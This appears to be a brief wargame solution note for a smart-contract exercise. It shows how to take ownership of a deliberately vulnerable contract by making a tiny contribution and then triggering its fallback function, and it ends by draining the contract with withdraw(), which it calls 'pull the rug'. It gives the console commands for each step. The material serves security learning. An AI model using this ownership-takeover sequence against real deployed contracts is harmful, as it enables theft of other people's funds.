withdraw() can only be called by the owner, so we need to become the owner.
fallback() assigns owner to msg.sender, so lets trigger it.

we need to make a small payment to contribution()
>> await contract.contribute({ value: 1})

then a small payment to fallback()
I did this through MetaMask (send to instance address)

check we're now owner
>> await contract.owner()

pull the rug
>> await contract.withdraw()
